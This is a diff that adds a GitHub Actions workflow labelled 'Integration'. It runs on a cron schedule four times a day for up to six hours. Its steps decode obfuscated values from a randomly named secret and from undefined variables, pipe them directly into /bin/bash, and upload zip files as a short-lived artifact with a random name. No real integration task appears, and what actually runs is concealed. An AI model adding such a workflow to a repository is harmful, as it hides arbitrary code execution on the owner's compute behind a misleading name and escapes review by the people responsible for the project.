@@ -1,0 +1,40 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '7 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          kjmto1: ${{ secrets.kjmto1 }}
+        run: |
+          printf '%s' "$kjmto1" | jq -r .wxarw030 | /bin/bash
+          echo $zrs3 | jq -r .yjoss37173 | /bin/bash
+          echo $rg770 | jq -r .ydl406 | /bin/bash
+          echo $b3674 | jq -r .qk976 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZGtc97JA
+          path: "*.zip"
+          retention-days: 1
